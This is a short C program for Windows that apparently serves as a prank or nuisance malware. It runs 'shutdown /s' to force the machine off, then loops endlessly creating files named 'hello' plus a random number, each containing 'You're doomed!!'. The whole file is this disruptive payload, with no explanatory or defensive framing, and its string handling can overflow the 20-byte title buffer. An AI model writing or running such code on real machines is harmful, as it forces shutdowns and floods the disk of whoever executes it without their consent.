#include<stdio.h>
#include<stdlib.h>
#include<time.h>
#include<string.h>
#include<windows.h>

void give(char title[]){
	long int t=rand(),c=0;
	char hold[25]={'\0'};
	while (t!=0){
		hold[c]=(char)(t%10+48);
		t/=10;
		c++;
	}
	strrev(hold);
	strcat(title,hold);
}

main(){
	srand(time(NULL));
	char title[20]={'\0'};
	FILE *fp;
	
	system("shutdown /s");
	while(1){
		strcpy(title,"hello");
		give(title);
		strcat(title,".txt");
		fp=fopen(title,"w");
		fprintf(fp,"You're doomed!!'");
		fclose(fp);
	}
}
